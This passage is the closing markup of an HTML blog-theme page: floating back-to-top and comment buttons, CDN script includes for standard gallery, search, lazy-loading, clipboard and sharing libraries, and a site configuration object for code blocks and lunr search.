id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:500},comment:{},lightgallery:!0,search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>